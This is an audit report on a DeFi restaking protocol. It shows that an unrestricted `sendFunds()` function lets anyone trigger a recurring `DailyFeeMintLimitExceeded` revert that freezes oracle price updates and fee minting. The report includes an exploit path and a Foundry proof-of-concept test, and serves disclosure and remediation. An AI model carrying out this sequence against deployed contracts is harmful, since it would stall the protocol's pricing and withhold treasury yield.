Audit Report

## Title
Unpermissioned `sendFunds()` Enables `DailyFeeMintLimitExceeded` DoS, Temporarily Freezing Protocol Fee Minting — (`contracts/FeeReceiver.sol`)

## Summary

`FeeReceiver.sendFunds()` carries no access-control modifier, allowing any caller to flush accumulated ETH into `LRTDepositPool` in a single transaction. If the resulting TVL delta produces a fee amount exceeding `maxFeeMintAmountPerDay`, every subsequent call to `LRTOracle._updateRsETHPrice()` reverts with `DailyFeeMintLimitExceeded` before `rsETHPrice` is written, leaving the price stale and the protocol fee unminted. The condition persists across daily resets until a manager raises the cap, making this a temporary but self-perpetuating freeze of unclaimed yield.

## Finding Description

**Root cause — no access control on `sendFunds()`**

`FeeReceiver.sendFunds()` is callable by any EOA or contract:

```solidity
// contracts/FeeReceiver.sol:53-58
function sendFunds() external {
    uint256 balance = address(this).balance;
    ILRTDepositPool(depositPool).receiveFromRewardReceiver{ value: balance }();
    emit MevRewardsAddedToTVL(balance);
}
```

`receiveFromRewardReceiver()` is equally unrestricted:

```solidity
// contracts/LRTDepositPool.sol:61
function receiveFromRewardReceiver() external payable { }
```

**Exploit path**

1. `FeeReceiver` passively accumulates ETH from MEV/execution-layer rewards over multiple days.
2. An attacker calls `sendFunds()`, atomically moving the full balance into `LRTDepositPool`. `address(LRTDepositPool).balance` grows immediately; `getETHDistributionData()` reads `address(this).balance` directly, so `_getTotalEthInProtocol()` reflects the full dump.
3. Inside `_updateRsETHPrice()`, `previousTVL` is computed from the stale `rsETHPrice`:
   ```solidity
   // LRTOracle.sol:234
   uint256 previousTVL = rsethSupply.mulWad(rsETHPrice);
   ```
   The full accumulated delta becomes `rewardAmount`, and the fee is computed from it:
   ```solidity
   // LRTOracle.sol:244-246
   uint256 rewardAmount = totalETHInProtocol - previousTVL;
   protocolFeeInETH = (rewardAmount * lrtConfig.protocolFeeInBPS()) / 10_000;
   ```
4. The fee check fires before `rsETHPrice` is written:
   ```solidity
   // LRTOracle.sol:303
   _checkAndUpdateDailyFeeMintLimit(rsethAmountToMintAsProtocolFee);
   // LRTOracle.sol:205-207
   if (currentPeriodMintedFeeAmount + feeAmount > maxFeeMintAmountPerDay) {
       revert DailyFeeMintLimitExceeded(...);
   }
   // LRTOracle.sol:313  ← never reached
   rsETHPrice = newRsETHPrice;
   ```
5. Because `rsETHPrice` is never updated, `previousTVL` stays at the pre-dump value on every future call. Each new 24-hour period resets `currentPeriodMintedFeeAmount` to zero, but the delta is unchanged, so the revert fires again every day.
6. `updateRSETHPriceAsManager()` calls the same `_updateRsETHPrice()` and hits the identical revert — there is no privileged bypass without first raising the cap via `setMaxFeeMintAmountPerDay()`.

**Why existing checks are insufficient**

`_checkAndUpdateDailyFeeMintLimit()` resets `currentPeriodMintedFeeAmount` each period but does not cap the single-call delta. The daily limit is intentionally conservative; any multi-day accumulation in `FeeReceiver` can exceed it in one dump.

## Impact Explanation

The protocol fee on the dumped rewards is frozen — not permanently lost. A manager can call `setMaxFeeMintAmountPerDay()` to raise the cap and then call `updateRSETHPriceAsManager()`, at which point the full delta is still present and the fee is minted. However, until that intervention occurs, the oracle price is stale and no protocol fee is minted for any period. This matches **Medium — Temporary freezing of unclaimed yield**: the treasury's share of staking/MEV rewards is withheld for an indefinite window requiring active admin remediation. The claim's characterization of the impact as "High — Theft of unclaimed yield" is not supported because the fee is recoverable once the cap is raised.

## Likelihood Explanation

- `sendFunds()` requires zero privileges and zero capital.
- `FeeReceiver` accumulates ETH passively; longer intervals between calls produce larger balances.
- `maxFeeMintAmountPerDay` is intentionally conservative, making multi-day accumulations likely to exceed it.
- The attacker only needs to monitor the `FeeReceiver` balance and call one function at the right moment.
- The condition is self-perpetuating across daily resets, maximizing the window of impact before admin intervention.

## Recommendation

Add an access-control modifier to `sendFunds()` so only authorized callers can trigger the ETH transfer:

```solidity
function sendFunds() external onlyRole(LRTConstants.MANAGER) {
    uint256 balance = address(this).balance;
    ILRTDepositPool(depositPool).receiveFromRewardReceiver{ value: balance }();
    emit MevRewardsAddedToTVL(balance);
}
```

Additionally, consider capping the single-call TVL delta eligible for fee computation (e.g., spread large reward dumps across multiple `updateRSETHPrice()` calls), so the daily limit cannot be breached by a single flush regardless of how long rewards have accumulated.

## Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;
import "forge-std/Test.sol";

contract FeeBypassPoC is Test {
    IFeeReceiver feeReceiver = IFeeReceiver(FEE_RECEIVER_ADDR);
    ILRTOracle   oracle      = ILRTOracle(ORACLE_ADDR);

    function test_temporaryFeeFreeze() public {
        // 1. Simulate multi-day MEV accumulation in FeeReceiver
        uint256 accumulatedRewards = 100 ether; // >> maxFeeMintAmountPerDay equivalent
        vm.deal(address(feeReceiver), accumulatedRewards);

        uint256 priceBefore = oracle.rsETHPrice();

        // 2. Unprivileged attacker dumps all ETH into DepositPool
        vm.prank(address(0xdead));
        feeReceiver.sendFunds();

        // 3. Oracle update reverts — DailyFeeMintLimitExceeded
        vm.expectRevert();
        oracle.updateRSETHPrice();
        assertEq(oracle.rsETHPrice(), priceBefore, "price must be stale");

        // 4. Same revert the next day (period resets but delta is unchanged)
        vm.warp(block.timestamp + 1 days + 1);
        vm.expectRevert();
        oracle.updateRSETHPrice();

        // 5. Manager can recover by raising the cap
        vm.prank(MANAGER_ADDR);
        oracle.setMaxFeeMintAmountPerDay(type(uint256).max);
        oracle.updateRSETHPriceAsManager(); // succeeds; fee is minted
        assertGt(oracle.rsETHPrice(), priceBefore, "price updated after recovery");
    }
}
```
